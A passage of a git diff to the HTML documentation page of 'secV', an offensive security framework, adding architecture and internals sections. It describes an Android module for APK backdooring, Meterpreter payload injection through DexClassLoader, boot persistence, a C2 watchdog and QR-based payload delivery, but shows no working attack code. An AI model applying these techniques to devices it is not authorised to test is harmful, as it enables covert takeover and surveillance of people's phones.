@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>secV — Documentation Hub</title>
+<title>secV - Documentation Hub</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
 <style>
@@ -98,7 +98,6 @@ nav.scrolled {
 }
 .nav-btn:hover { border-color: var(--border3); color: var(--white); }
 
-/* mobile burger */
 .burger {
   display: none;
   background: none;
@@ -149,7 +148,7 @@ h1 em { font-style: normal; color: var(--muted); }
 .hero-sub {
   font-size: 0.84rem;
   color: var(--muted);
-  max-width: 520px;
+  max-width: 560px;
   line-height: 1.9;
   margin-bottom: 2.75rem;
 }
@@ -229,6 +228,16 @@ h2 {
   margin-bottom: 2.5rem;
 }
 
+h3 {
+  font-family: var(--disp);
+  font-size: 1.1rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  color: var(--white);
+  margin-bottom: 1rem;
+  margin-top: 2.5rem;
+}
+
 /* ── Active project banner ── */
 .project-banner {
   display: flex;
@@ -303,7 +312,6 @@ h2 {
 .module-card:hover::before { opacity: 1; }
 .module-card.wip::before { background: var(--grey); }
 
-/* status badges — no green */
 .mod-status {
   font-size: 0.48rem;
   letter-spacing: 0.16em;
@@ -322,23 +330,11 @@ h2 {
   border-radius: 50%;
   flex-shrink: 0;
 }
-.status-stable {
-  color: var(--off);
-  border-color: var(--border2);
-  background: rgba(255,255,255,0.04);
-}
+.status-stable { color: var(--off); border-color: var(--border2); background: rgba(255,255,255,0.04); }
 .status-stable::before { background: var(--white); }
-.status-beta {
-  color: #b89a48;
-  border-color: rgba(184,154,72,0.2);
-  background: rgba(184,154,72,0.06);
-}
+.status-beta { color: #b89a48; border-color: rgba(184,154,72,0.2); background: rgba(184,154,72,0.06); }
 .status-beta::before { background: #b89a48; }
-.status-wip {
-  color: var(--muted);
-  border-color: var(--border);
-  background: transparent;
-}
+.status-wip { color: var(--muted); border-color: var(--border); background: transparent; }
 .status-wip::before { background: var(--muted); }
 
 .mod-name {
@@ -349,19 +345,8 @@ h2 {
   margin-bottom: 0.4rem;
   letter-spacing: -0.02em;
 }
-.mod-category {
-  font-size: 0.54rem;
-  letter-spacing: 0.14em;
-  text-transform: uppercase;
-  color: var(--muted);
-  margin-bottom: 0.85rem;
-}
-.mod-desc {
-  font-size: 0.76rem;
-  color: var(--text);
-  line-height: 1.75;
-  margin-bottom: 1.4rem;
-}
+.mod-category { font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.85rem; }
+.mod-desc { font-size: 0.76rem; color: var(--text); line-height: 1.75; margin-bottom: 1.4rem; }
 .mod-tags { display: flex; flex-wrap: wrap; gap: 0.3rem; }
 .tag {
   font-size: 0.48rem;
@@ -412,11 +397,7 @@ h2 {
 .cmd-table tr { border-bottom: 1px solid var(--border); }
 .cmd-table tr:last-child { border-bottom: none; }
 .cmd-table td { padding: 0.7rem 0.85rem; font-size: 0.74rem; vertical-align: top; line-height: 1.65; }
-.cmd-table td:first-child {
-  color: var(--white);
-  white-space: nowrap;
-  width: 38%;
-}
+.cmd-table td:first-child { color: var(--white); white-space: nowrap; width: 38%; }
 .cmd-table td:last-child { color: var(--muted); }
 .cmd-group-header td {
   font-size: 0.48rem;
@@ -430,30 +411,204 @@ h2 {
 }
 .cmd-table tr:hover td { background: var(--bg1); }
 .cmd-table .cmd-group-header:hover td { background: transparent; }
-.cmd-table code {
-  font-size: 0.7rem;
-  color: var(--off);
-  background: var(--bg2);
+.cmd-table code { font-size: 0.7rem; color: var(--off); background: var(--bg2); border: 1px solid var(--border); padding: 0.05rem 0.3rem; }
+
+/* ── Prose body text ── */
+.body-text {
+  font-size: 0.78rem;
+  color: var(--text);
+  line-height: 1.9;
+  margin-bottom: 1.6rem;
+  max-width: 760px;
+}
+.body-text a { color: var(--off); text-decoration: none; border-bottom: 1px solid var(--border2); transition: color var(--t), border-color var(--t); }
+.body-text a:hover { color: var(--white); border-color: var(--text); }
+
+/* ── Architecture diagram ── */
+.arch-flow {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  flex-wrap: wrap;
+  margin: 2rem 0;
   border: 1px solid var(--border);
-  padding: 0.05rem 0.3rem;
+  background: var(--bg1);
+  overflow: hidden;
+}
+.arch-node {
+  flex: 1;
+  min-width: 120px;
+  padding: 1.2rem 1.4rem;
+  border-right: 1px solid var(--border);
+  text-align: center;
+}
+.arch-node:last-child { border-right: none; }
+.arch-node-label {
+  font-size: 0.46rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.4rem;
+}
+.arch-node-name {
+  font-family: var(--disp);
+  font-size: 0.88rem;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 0.25rem;
+}
+.arch-node-detail {
+  font-size: 0.6rem;
+  color: var(--muted);
+  line-height: 1.6;
+}
+.arch-arrow {
+  font-size: 1rem;
+  color: var(--muted);
+  padding: 0 0.2rem;
+  flex-shrink: 0;
 }
 
-/* ── Prompt preview ── */
+/* ── Info cards ── */
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  margin: 1.5rem 0 2.5rem;
+}
+.info-card {
+  background: var(--bg);
+  padding: 1.4rem 1.6rem;
+}
+.info-card-num {
+  font-family: var(--disp);
+  font-size: 1.8rem;
+  font-weight: 800;
+  color: var(--dim);
+  letter-spacing: -0.04em;
+  margin-bottom: 0.5rem;
+}
+.info-card-title {
+  font-size: 0.72rem;
+  font-weight: 600;
+  color: var(--white);
+  margin-bottom: 0.4rem;
+}
+.info-card-body { font-size: 0.66rem; color: var(--muted); line-height: 1.7; }
+
+/* ── Pre / code ── */
 pre {
   background: var(--bg1);
   border: 1px solid var(--border);
   border-left: 3px solid var(--border2);
   padding: 1rem 1.25rem;
-  font-size: 0.78rem;
+  font-size: 0.75rem;
   overflow-x: auto;
   color: var(--text);
-  margin-top: 0.6rem;
+  margin: 0.8rem 0 1.6rem;
   line-height: 1.75;
   border-radius: 0 2px 2px 0;
 }
 code { font-family: var(--mono); }
 .hl  { color: var(--white); }
 .cm  { color: var(--muted); font-style: italic; }
+.kw  { color: #8aabcc; }
+.st  { color: #b89a48; }
+.nu  { color: #a89060; }
+
+/* ── Notice / callout ── */
+.callout {
+  border: 1px solid var(--border2);
+  border-left: 3px solid var(--white);
+  background: var(--bg1);
+  padding: 0.9rem 1.2rem;
+  font-size: 0.72rem;
+  color: var(--text);
+  line-height: 1.8;
+  margin: 1.4rem 0 2rem;
+}
+.callout strong { color: var(--white); }
+.callout.warn { border-left-color: #b89a48; }
+.callout.warn strong { color: #b89a48; }
+
+/* ── Chain diagram ── */
+.chain {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  border: 1px solid var(--border);
+  margin: 1.5rem 0 2rem;
+}
+.chain-step {
+  display: grid;
+  grid-template-columns: 2.5rem 1fr;
+  gap: 1rem;
+  padding: 1rem 1.2rem;
+  border-bottom: 1px solid var(--border);
+  align-items: start;
+  background: var(--bg);
+  transition: background var(--t);
+}
+.chain-step:last-child { border-bottom: none; }
+.chain-step:hover { background: var(--bg1); }
+.chain-num {
+  font-family: var(--disp);
+  font-size: 0.7rem;
+  font-weight: 800;
+  color: var(--muted);
+  letter-spacing: -0.02em;
+  padding-top: 0.1rem;
+}
+.chain-content-title { font-size: 0.76rem; font-weight: 600; color: var(--white); margin-bottom: 0.25rem; }
+.chain-content-body { font-size: 0.68rem; color: var(--muted); line-height: 1.65; }
+.chain-content-code { font-family: var(--mono); font-size: 0.64rem; color: var(--off); background: var(--bg2); border: 1px solid var(--border); padding: 0.04rem 0.3rem; }
+
+/* ── Two-col layout ── */
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1.5rem;
+  margin: 1.5rem 0 2rem;
+}
+@media (max-width: 680px) { .two-col { grid-template-columns: 1fr; } }
+.col-card {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  padding: 1.4rem;
+}
+.col-card-title {
+  font-size: 0.62rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.8rem;
+  padding-bottom: 0.6rem;
+  border-bottom: 1px solid var(--border);
+}
+.col-card-body { font-size: 0.7rem; color: var(--text); line-height: 1.8; }
+
+/* ── Param table ── */
+.param-table { width: 100%; border-collapse: collapse; margin: 1rem 0 2rem; }
+.param-table th {
+  font-size: 0.46rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--muted);
+  padding: 0.5rem 0.8rem;
+  text-align: left;
+  border-bottom: 1px solid var(--border2);
+  font-weight: 400;
+}
+.param-table td { padding: 0.65rem 0.8rem; font-size: 0.72rem; vertical-align: top; border-bottom: 1px solid var(--border); line-height: 1.6; }
+.param-table td:first-child { color: var(--white); font-family: var(--mono); }
+.param-table td:nth-child(2) { color: var(--muted); font-size: 0.65rem; }
+.param-table td:last-child { color: var(--text); }
+.param-table tr:last-child td { border-bottom: none; }
+.param-table tr:hover td { background: var(--bg1); }
+.req-yes { color: var(--off); }
+.req-no  { color: var(--muted); }
 
 /* ── Quickstart steps ── */
 .quickstart { margin-bottom: 2rem; }
@@ -476,18 +631,8 @@ code { font-family: var(--mono); }
   letter-spacing: -0.04em;
   padding-top: 0.1rem;
 }
-.step-title {
-  font-size: 0.84rem;
-  font-weight: 600;
-  color: var(--white);
-  margin-bottom: 0.4rem;
-}
-.step-body {
-  font-size: 0.74rem;
-  color: var(--muted);
-  line-height: 1.75;
-  margin-bottom: 0.6rem;
-}
+.step-title { font-size: 0.84rem; font-weight: 600; color: var(--white); margin-bottom: 0.4rem; }
+.step-body { font-size: 0.74rem; color: var(--muted); line-height: 1.75; margin-bottom: 0.6rem; }
 
 /* ── Footer ── */
 footer {
@@ -501,23 +646,9 @@ footer {
   max-width: 1020px;
   margin: 0 auto;
 }
-.foot-brand {
-  font-family: var(--disp);
-  font-size: 0.88rem;
-  font-weight: 700;
-  color: var(--muted);
-  text-decoration: none;
-  letter-spacing: -0.02em;
-}
+.foot-brand { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--muted); text-decoration: none; letter-spacing: -0.02em; }
 .foot-links { display: flex; gap: 1.75rem; }
-.foot-link {
-  font-size: 0.54rem;
-  letter-spacing: 0.1em;
-  text-transform: uppercase;
-  color: var(--muted);
-  text-decoration: none;
-  transition: color var(--t);
-}
+.foot-link { font-size: 0.54rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color var(--t); }
 .foot-link:hover { color: var(--text); }
 .foot-note { font-size: 0.5rem; color: var(--dim); letter-spacing: 0.06em; }
 
@@ -526,8 +657,8 @@ footer {
   from { opacity: 0; transform: translateY(12px); }
   to   { opacity: 1; transform: none; }
 }
-.hero h1         { animation: rise 0.55s 0.06s ease both; }
-.hero .hero-sub  { animation: rise 0.55s 0.16s ease both; }
+.hero h1        { animation: rise 0.55s 0.06s ease both; }
+.hero .hero-sub { animation: rise 0.55s 0.16s ease both; }
 .hero .install-block { animation: rise 0.55s 0.26s ease both; }
 
 /* ── Responsive ── */
@@ -552,6 +683,9 @@ footer {
   footer { padding: 1.25rem; }
   .module-grid { grid-template-columns: 1fr; }
   .project-banner { flex-direction: column; align-items: flex-start; }
+  .arch-flow { flex-direction: column; }
+  .arch-node { border-right: none; border-bottom: 1px solid var(--border); }
+  .arch-node:last-child { border-bottom: none; }
 }
 </style>
 </head>
@@ -563,7 +697,10 @@ footer {
   </a>
   <div class="nav-links">
     <a class="nav-link" href="#modules">Modules</a>
+    <a class="nav-link" href="#architecture">Architecture</a>
+    <a class="nav-link" href="#internals">Internals</a>
     <a class="nav-link" href="#shell">Shell</a>
+    <a class="nav-link" href="#c2stack">C2 Stack</a>
     <a class="nav-link" href="#quickstart">Quickstart</a>
     <a class="nav-btn" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
   </div>
@@ -583,9 +720,10 @@ footer {
   </div>
   <h1>secV<br><em>Documentation</em></h1>
   <p class="hero-sub">
-    secV is a modular offensive security framework with a REPL shell,
-    tab-completion, and Linux-native navigation. Each module is a self-contained
-    tool loaded on demand.
+    secV is a modular offensive security framework built around a Go REPL shell and
+    Python-driven modules. Each module is a self-contained tool that receives targets
+    and parameters over stdin and returns structured findings over stdout. The shell
+    handles dispatch, tab-completion, session tracking, and live module reloading.
   </p>
   <div class="install-block">
     <span class="install-label">Install</span>
@@ -603,7 +741,6 @@ footer {
   <p class="section-label">Current Project</p>
   <h2>secV Modules</h2>
 
-  <!-- Active project banner -->
   <div class="project-banner">
     <div class="project-banner-left">
       <div class="project-banner-dot"></div>
@@ -615,7 +752,7 @@ footer {
     <div class="project-banner-meta">
       <span>
         <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-        v2.4.0 · active
+        v2.5.0 · active
       </span>
       <span>
         <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
@@ -623,7 +760,7 @@ footer {
       </span>
       <span>
         <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
-        Python 3 · MIT
+        Go shell · Python modules · MIT
       </span>
     </div>
   </div>
@@ -645,7 +782,6 @@ footer {
         <span class="tag">masscan</span>
         <span class="tag">rustscan</span>
         <span class="tag">iot</span>
-        <span class="tag">ics/scada</span>
         <span class="tag">cve</span>
         <span class="tag">geo</span>
       </div>
@@ -654,21 +790,21 @@ footer {
 
     <!-- android_pentest -->
     <a class="module-card" href="modules/android_pentest.html">
-      <span class="mod-status status-beta">Beta</span>
+      <span class="mod-status status-stable">Stable</span>
       <div class="mod-name">android_pentest</div>
       <div class="mod-category">Mobile · Android</div>
       <div class="mod-desc">
-        Comprehensive Android security testing framework. APK analysis, static
-        analysis, backdoor injection, Metasploit handler management, ADB shell
-        access, and payload deployment via msfvenom.
+        Full Android security testing suite - APK static analysis, smali patching,
+        boot persistence via Termux:Boot, WAN C2 with DexClassLoader staging,
+        Frida/Objection instrumentation, and QR-based payload delivery.
       </div>
       <div class="mod-tags">
         <span class="tag">adb</span>
         <span class="tag">apktool</span>
-        <span class="tag">jadx</span>
-        <span class="tag">msfvenom</span>
-        <span class="tag">backdoor</span>
+        <span class="tag">dexclassloader</span>
+        <span class="tag">bore</span>
         <span class="tag">frida</span>
+        <span class="tag">qr</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
@@ -712,12 +848,647 @@ footer {
       <span class="mod-arrow">→</span>
     </a>
 
+    <!-- wifi_monitor -->
+    <a class="module-card" href="modules/wifi_monitor.html">
+      <span class="mod-status status-beta">Beta</span>
+      <div class="mod-name">wifi_monitor</div>
+      <div class="mod-category">Network · Wireless</div>
+      <div class="mod-desc">
+        Passive WiFi network monitor. Discovers hosts, fingerprints device types
+        (IoT cameras, routers, NAS, databases), detects exposed services, maps
+        CVEs, and exports structured JSON reports.
+      </div>
+      <div class="mod-tags">
+        <span class="tag">wifi</span>
+        <span class="tag">arp</span>
+        <span class="tag">fingerprint</span>
+        <span class="tag">iot</span>
+        <span class="tag">cve</span>
+        <span class="tag">threat</span>
+      </div>
+      <span class="mod-arrow">→</span>
+    </a>
+
+    <!-- webscan -->
+    <a class="module-card wip" href="#">
+      <span class="mod-status status-wip">WIP</span>
+      <div class="mod-name">webscan</div>
+      <div class="mod-category">Web · Vulnerability</div>
+      <div class="mod-desc">
+        Web application vulnerability scanner. Header analysis, SSL/TLS audit,
+        directory brute-force, XSS/SQLi probing, CMS detection, and CVE
+        correlation for server technologies.
+      </div>
+      <div class="mod-tags">
+        <span class="tag">headers</span>
+        <span class="tag">ssl</span>
+        <span class="tag">xss</span>
+        <span class="tag">sqli</span>
+        <span class="tag">cms</span>
+      </div>
+      <span class="mod-arrow">→</span>
+    </a>
+
   </div>
 </div>
 
 <hr class="rule">
 
-<!-- Shell reference -->
+<!-- Architecture -->
+<div class="wrap" id="architecture">
+  <p class="section-label">How It Works</p>
+  <h2>Architecture</h2>
+
+  <p class="body-text">
+    secV is split into two layers: a <strong style="color:var(--white)">Go REPL shell</strong> that handles all user interaction,
+    and <strong style="color:var(--white)">Python (or Bash) modules</strong> that do the actual work. The shell never embeds
+    tool-specific logic - it only knows how to load modules, manage parameters, and route
+    stdin/stdout. This keeps the binary small (~4 MB) and makes adding new modules as simple
+    as dropping a Python file into the right directory.
+  </p>
+
+  <div class="arch-flow">
+    <div class="arch-node">
+      <div class="arch-node-label">User</div>
+      <div class="arch-node-name">Terminal</div>
+      <div class="arch-node-detail">REPL commands<br>tab-completion<br>param editing</div>
+    </div>
+    <div class="arch-arrow">→</div>
+    <div class="arch-node">
+      <div class="arch-node-label">Binary</div>
+      <div class="arch-node-name">secV (Go)</div>
+      <div class="arch-node-detail">command parser<br>module loader<br>session tracker</div>
+    </div>
+    <div class="arch-arrow">→</div>
+    <div class="arch-node">
+      <div class="arch-node-label">Protocol</div>
+      <div class="arch-node-name">stdin JSON</div>
+      <div class="arch-node-detail">{"target":"…"<br>"params":{…}}</div>
+    </div>
+    <div class="arch-arrow">→</div>
+    <div class="arch-node">
+      <div class="arch-node-label">Module</div>
+      <div class="arch-node-name">Python script</div>
+      <div class="arch-node-detail">reads stdin<br>runs operations<br>writes JSON out</div>
+    </div>
+    <div class="arch-arrow">→</div>
+    <div class="arch-node">
+      <div class="arch-node-label">Output</div>
+      <div class="arch-node-name">findings JSON</div>
+      <div class="arch-node-detail">{"findings":[…]<br>"errors":[…]<br>"logs":[…]}</div>
+    </div>
+  </div>
+
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-card-num">01</div>
+      <div class="info-card-title">Module Discovery</div>
+      <div class="info-card-body">
+        At startup the shell walks <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">tools/</code>
+        and loads every <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">module.json</code>
+        it finds. Each JSON file declares the module's name, description, entry-point binary,
+        accepted parameters, and required dependencies. The shell never executes anything
+        until <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">run</code> is called.
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num">02</div>
+      <div class="info-card-title">Parameter Model</div>
+      <div class="info-card-body">
+        Every value the user sets with <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">set</code>
+        is stored in the shell's in-memory param map. When <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">run</code>
+        is called the shell serialises the map plus the target into a single JSON object
+        and writes it to the module's stdin. The module reads one line, parses it, and proceeds.
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num">03</div>
+      <div class="info-card-title">Output Contract</div>
+      <div class="info-card-body">
+        Modules write UTF-8 lines to stdout. Lines that start with
+        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">FINDING:</code> are parsed as JSON findings.
+        Lines starting with <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">LOG:</code> become log entries.
+        Everything else is streamed directly to the terminal as progress output.
+        When the process exits the shell collects all findings and renders a summary table.
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num">04</div>
+      <div class="info-card-title">Session Tracking</div>
+      <div class="info-card-body">
+        The shell maintains a live session registry. Meterpreter sessions opened through
+        android_pentest are tracked by PID and metadata. Use
+        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions list</code> to view,
+        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions interact &lt;id&gt;</code>
+        to drop into a session, or <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions kill &lt;id&gt;</code> to terminate it.
+      </div>
+    </div>
+  </div>
+
+  <h3>Directory Layout</h3>
+  <p class="body-text">
+    The repository follows a consistent structure. The Go shell binary lives at the root.
+    All modules live under <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">tools/</code>,
+    grouped by category. Each module folder contains a <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">module.json</code>
+    and one or more Python scripts.
+  </p>
+  <pre><code><span class="hl">secV/</span>
+├── <span class="kw">secV</span>                       <span class="cm"># compiled Go REPL binary</span>
+├── <span class="kw">main.go</span>                    <span class="cm"># shell source - REPL loop, command parser, module loader</span>
+├── install.sh                 <span class="cm"># dependency installer + binary builder</span>
+├── update.py                  <span class="cm"># git pull + rebuild + sync_tools()</span>
+├── tools/
+│   ├── network/
+│   │   ├── netrecon/
+│   │   │   ├── <span class="st">module.json</span>    <span class="cm"># name, desc, entry, params, deps</span>
+│   │   │   └── netrecon.py
+│   │   ├── mac_spoof/
+│   │   └── wifi_monitor/
+│   ├── mobile/
+│   │   └── android/
+│   │       ├── <span class="st">module.json</span>
+│   │       ├── android_pentest.py
+│   │       ├── apk_backdoor/
+│   │       │   ├── build_bootbuddy.py   <span class="cm"># APK patcher + QR delivery</span>
+│   │       │   ├── AgentService.smali
+│   │       │   └── output/              <span class="cm"># rebuilt.apk  s.dex  apk_delivery.png</span>
+│   │       └── c2_persistence/
+│   │           ├── c2_watchdog.sh       <span class="cm"># bore tunnels + MSF + DEX server</span>
+│   │           └── secv-c2.service
+│   └── web/
+│       └── webscan/
+└── gen_module.py              <span class="cm"># scaffold a new module interactively</span></code></pre>
+
+</div>
+
+<hr class="rule">
+
+<!-- Internals -->
+<div class="wrap" id="internals">
+  <p class="section-label">Code Deep Dive</p>
+  <h2>Internals</h2>
+
+  <p class="body-text">
+    This section explains how the key pieces of secV work at the code level.
+    It is intended for people who want to understand, extend, or audit the framework -
+    not just use it.
+  </p>
+
+  <h3>The REPL Loop (main.go)</h3>
+  <p class="body-text">
+    The shell is a standard Go read-eval-print loop. On each iteration it prints a prompt,
+    reads a line, tokenises it, and dispatches to a handler. The prompt is built dynamically:
+    it shows the loaded module name and the count of currently-set parameters so you always
+    know your context at a glance.
+  </p>
+  <pre><code><span class="cm">// Simplified prompt construction - actual code in main.go</span>
+<span class="kw">func</span> buildPrompt(mod *Module, params map[string]string) string {
+    <span class="kw">if</span> mod == nil {
+        <span class="kw">return</span> <span class="st">"secV ❯ "</span>
+    }
+    op := params[<span class="st">"operation"</span>]
+    n  := len(params)
+    <span class="kw">if</span> op != <span class="st">""</span> {
+        <span class="kw">return</span> fmt.Sprintf(<span class="st">"secV %s › %s [%d params] ❯ "</span>, mod.Name, op, n)
+    }
+    <span class="kw">return</span> fmt.Sprintf(<span class="st">"secV %s ❯ "</span>, mod.Name)
+}</code></pre>
+
+  <p class="body-text">
+    Built-in commands (<code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">use</code>,
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">set</code>,
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">run</code>,
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">back</code> etc.) are matched first.
+    If no built-in matches, the shell checks whether the first token is a Linux binary
+    (via <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">exec.LookPath</code>) and executes it
+    as a subprocess - this is how native Linux commands like <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">ls</code>,
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">cat</code>, and <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">grep</code> work natively
+    from inside secV without any special handling.
+  </p>
+
+  <h3>Module Loading (module.json)</h3>
+  <p class="body-text">
+    Every module directory contains a <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">module.json</code>
+    that the shell reads at startup (and on <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">reload</code>).
+    The JSON defines everything the shell needs to know about the module - no code is
+    executed at load time.
+  </p>
+  <pre><code><span class="cm">// Example module.json (android_pentest, abbreviated)</span>
+{
+  <span class="st">"name"</span>:        <span class="st">"android_pentest"</span>,
+  <span class="st">"version"</span>:     <span class="st">"2.0"</span>,
+  <span class="st">"description"</span>: <span class="st">"Android security testing suite"</span>,
+  <span class="st">"entry"</span>:       <span class="st">"android_pentest.py"</span>,    <span class="cm">// script the shell invokes</span>
+  <span class="st">"author"</span>:      <span class="st">"0xb0rn3"</span>,
+  <span class="st">"parameters"</span>: {
+    <span class="st">"operation"</span>: {
+      <span class="st">"type"</span>:     <span class="st">"string"</span>,
+      <span class="st">"required"</span>: true,
+      <span class="st">"options"</span>:  [<span class="st">"recon"</span>, <span class="st">"static_analysis"</span>, <span class="st">"backdoor_apk"</span>, <span class="st">"rebuild"</span>, ...],
+      <span class="st">"help"</span>:     <span class="st">"Operation to perform"</span>
+    },
+    <span class="st">"msf"</span>: {
+      <span class="st">"type"</span>:     <span class="st">"boolean"</span>,
+      <span class="st">"required"</span>: false,
+      <span class="st">"default"</span>:  false,
+      <span class="st">"help"</span>:     <span class="st">"Inject DexClassLoader Meterpreter payload"</span>
+    }
+    <span class="cm">// ... more params</span>
+  },
+  <span class="st">"dependencies"</span>: [<span class="st">"adb"</span>, <span class="st">"apktool"</span>, <span class="st">"java"</span>, <span class="st">"msfvenom"</span>]
+}</code></pre>
+
+  <p class="body-text">
+    When the user runs <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">use android_pentest</code>
+    the shell reads this JSON, builds the tab-completion candidates from the
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">parameters</code> map and each parameter's
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">options</code> list, and checks whether all
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">dependencies</code> are on PATH.
+    Nothing is executed yet.
+  </p>
+
+  <h3>The stdin/stdout Protocol</h3>
+  <p class="body-text">
+    When the user calls <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">run &lt;target&gt;</code>
+    the shell spawns the entry-point script as a subprocess, writes a single JSON line to
+    its stdin, and then streams the subprocess's stdout directly to the terminal.
+    The module reads the JSON, executes the requested operation, and emits findings.
+  </p>
+  <div class="two-col">
+    <div class="col-card">
+      <div class="col-card-title">Shell → Module (stdin)</div>
+      <div class="col-card-body">
+<pre style="margin:0;border:none;background:none;padding:0;font-size:0.68rem">{
+  <span class="st">"target"</span>: <span class="st">"192.168.1.1"</span>,
+  <span class="st">"params"</span>: {
+    <span class="st">"operation"</span>: <span class="st">"recon"</span>,
+    <span class="st">"mode"</span>:      <span class="st">"deep"</span>,
+    <span class="st">"threads"</span>:   <span class="st">"30"</span>
+  }
+}</pre>
+      </div>
+    </div>
+    <div class="col-card">
+      <div class="col-card-title">Module → Shell (stdout)</div>
+      <div class="col-card-body">
+<pre style="margin:0;border:none;background:none;padding:0;font-size:0.68rem"><span class="cm"># Progress lines go straight to terminal</span>
+[*] Scanning 192.168.1.1...
+[+] Port 22 open - OpenSSH 8.9
+
+<span class="cm"># Findings lines parsed by shell</span>
+FINDING: {"category":"open_port",
+          "port":22,"service":"ssh",
+          "version":"OpenSSH 8.9"}
+
+<span class="cm"># Log lines stored in session</span>
+LOG: scan completed in 4.2s</pre>
+      </div>
+    </div>
+  </div>
+
+  <h3>How a Python Module Receives Data</h3>
+  <p class="body-text">
+    Every Python module starts with the same boilerplate: read one JSON line from stdin,
+    extract <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">target</code> and
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">params</code>, dispatch to the requested operation,
